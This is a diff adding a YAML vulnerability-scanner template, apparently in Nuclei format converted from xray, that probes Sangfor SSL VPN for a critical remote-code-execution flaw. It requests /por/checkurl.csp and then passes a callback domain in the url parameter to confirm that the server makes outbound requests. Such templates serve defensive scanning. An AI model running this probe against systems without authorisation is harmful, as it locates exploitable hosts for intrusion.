@@ -1,0 +1,29 @@
+id: yaml-poc-sangfor-sslvpn-rce-CT-631367
+
+info:
+  name: yaml-poc-sangfor-sslvpn-rce-CT-631367
+  author: haiqing.chen
+  severity: critical
+  tags: xray-converted,rce
+
+http:
+  - raw:
+      - |
+        GET /por/checkurl.csp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /por/checkurl.csp?url=http://{{reverseDomain}}&retry=0&timeout=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
